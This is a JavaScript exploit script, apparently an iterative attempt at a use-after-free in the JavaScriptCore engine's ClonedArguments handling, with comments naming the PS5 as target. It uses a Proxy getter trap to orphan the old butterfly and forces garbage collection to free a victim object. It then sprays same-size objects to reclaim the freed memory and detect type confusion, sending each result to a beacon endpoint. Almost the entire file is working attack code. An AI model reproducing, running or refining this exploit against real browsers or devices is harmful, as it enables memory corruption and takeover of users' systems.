// p247 - ClonedArguments UAF via VICTIM OBJECT REPLACEMENT
//
// Key insight: old butterfly is pinned alive by conservative GC,
// but its CONTENTS are NOT traced (SlotVisitor.cpp:217-219).
// Objects referenced only from the old butterfly can be freed.
//
// Technique:
// 1. Put victim V at slot 0, create hole at slot H
// 2. In trap: grow butterfly (orphans old), overwrite slot 0 in
//    NEW butterfly to null, drop all refs to V
// 3. GC -> V collected (only ref was from old butterfly, not traced)
// 4. Spray objects same size as V -> reclaim V's address
// 5. copyToArguments reads old butterfly slot 0 -> stale JSValue
//    now points to spray object = TYPE CONFUSION
//
// Beacon prefix: V247-

(function() {
  function B(tag, body) {
    var url = '/beacon/V247-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  function attempt(round) {
    // Create victim: small object in specific size class
    // JSObject with 1 inline property = ~48 bytes (JSCell 8 + structure 8 + butterfly 8 + inline 8*N)
    // On PS5: JSCell(8) + structureID(4) + indexingType(1) + type(1) + flags(1) + cellState(1)
    //         + butterfly(8) = 24 bytes base + inline props
    // With 2 inline props: 24 + 16 = 40 bytes -> 48 byte size class
    var victim = {victimA: 0xAAAA, victimB: 0xBBBB};
    var victimRef = victim; // extra ref we'll null in trap

    var N = 64;
    var HOLE = 5;
    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (i === 0) argArr.push(victim);  // victim at slot 0
      else if (i === 1) argArr.push(victim); // also slot 1
      else if (i === HOLE) argArr.push(i + 1);
      else argArr.push(i + 1);
    }

    var args = target.apply(null, argArr);
    delete args[HOLE]; // create hole

    // Drop argArr ref to victim
    argArr[0] = null;
    argArr[1] = null;
    argArr = null;

    var trapFired = false;
    var sprayObjs = [];

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        // Step 1: Grow butterfly massively -> new alloc, old orphaned
        for (var j = 100; j < 1000; j++) {
          args[j] = 0x41414141;
        }

        // Step 2: Overwrite slot 0 and 1 in NEW butterfly to remove
        // V reference from the GC-traced object graph
        args[0] = null;
        args[1] = null;

        // Step 3: Drop ALL remaining JS refs to victim
        victim = null;
        victimRef = null;

        // Step 4: Heavy GC to collect victim
        // victim is now only referenced from old butterfly (not traced)
        for (var g = 0; g < 60; g++) {
          var batch = [];
          for (var k = 0; k < 10000; k++) {
            batch.push({x: k, y: String(k)});
          }
          batch = null;
        }
        for (var g2 = 0; g2 < 40; g2++) {
          var batch2 = [];
          for (var k2 = 0; k2 < 10000; k2++) {
            batch2.push({a: k2});
          }
          batch2 = null;
        }

        // Step 5: Spray objects same size class as victim (~48 bytes)
        // Objects with 2 properties = same MarkedBlock size class
        sprayObjs = [];
        for (var s = 0; s < 8000; s++) {
          // Spray object with distinctive property values
          // If type confusion works, we'll read these as victim's properties
          sprayObjs.push({
            sprayA: 0xC0FE0000 + (s & 0xFFFF),
            sprayB: 0xDEAD0000 + (s & 0xFFFF)
          });
        }

        B('R' + round + '-TRAP-SPRAYED-' + sprayObjs.length);
        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }
    B('R' + round + '-LEN-' + result.length);

    // Check result[0] and result[1]
    // If victim was replaced, these should be spray objects
    var v0 = result[0];
    var v1 = result[1];

    B('R' + round + '-S0-TYPE-' + typeof v0);
    B('R' + round + '-S1-TYPE-' + typeof v1);

    if (typeof v0 === 'object' && v0 !== null) {
      // Check if it's a spray object
      if (v0.sprayA !== undefined) {
        var sa = v0.sprayA >>> 0;
        B('R' + round + '-REPLACED-S0-' + hex(sa));
        B('R' + round + '-FAKEOBJ-CONFIRMED');
        return {hit: true, obj: v0};
      } else if (v0.victimA !== undefined) {
        // Still the original victim (it survived GC)
        B('R' + round + '-VICTIM-ALIVE-S0');
      } else {
        // Unknown object - could be partially overwritten
        B('R' + round + '-UNKNOWN-OBJ-S0');
        try {
          var keys = Object.keys(v0);
          B('R' + round + '-KEYS-' + keys.join(',').substring(0, 40));
        } catch(e) {
          B('R' + round + '-KEYS-ERR');
        }
      }
    } else if (typeof v0 === 'number') {
      // Got a number from what should be an object slot
      // This means the JSValue was reinterpreted
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = v0;
      var dv = new DataView(buf);
      var hi = dv.getUint32(4, false);
      var lo = dv.getUint32(0, false);
      B('R' + round + '-S0-NUM-' + hex(hi) + hex(lo));
    } else if (v0 === null || v0 === undefined) {
      B('R' + round + '-S0-NULLISH');
    }

    // Check other slots for markers
    var origCount = 0;
    for (var i = 2; i < Math.min(result.length, N); i++) {
      if (i === HOLE) continue;
      var v = result[i];
      if (typeof v === 'number' && v === (i + 1)) origCount++;
    }
    B('R' + round + '-ORIG-' + origCount);

    return null;
  }

  // Run 10 rounds
  var success = false;
  for (var r = 0; r < 10; r++) {
    var res = attempt(r);
    if (res && res.hit) {
      success = true;
      B('SUCCESS-ROUND-' + r);

      // If we got a spray object via type confusion,
      // try to verify by checking its properties
      var obj = res.obj;
      B('SPRAY-A-' + hex((obj.sprayA || 0) >>> 0));
      B('SPRAY-B-' + hex((obj.sprayB || 0) >>> 0));
      break;
    }
  }

  if (!success) {
    B('ALL-ROUNDS-FAILED');
  }

  B('DONE');
})();
